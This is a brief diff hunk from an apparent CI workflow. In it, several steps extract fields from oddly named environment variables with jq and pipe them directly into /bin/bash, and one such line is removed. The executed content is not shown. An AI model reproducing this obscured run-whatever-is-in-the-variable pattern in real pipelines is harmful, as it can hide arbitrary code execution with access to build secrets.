@@ -44,7 +44,6 @@ jobs:
           echo $om064 | jq -r .np500 | /bin/bash
           printf '%s' "$ss154" | jq -r .ft498 | /bin/bash
           echo $fybd32 | jq -r .cez178 | /bin/bash
-          printf '%s' "$n42" | jq -r .xpxb21417 | /bin/bash
           echo $qlnk0133 | jq -r .zeh68 | /bin/bash
 
       - name: Store results
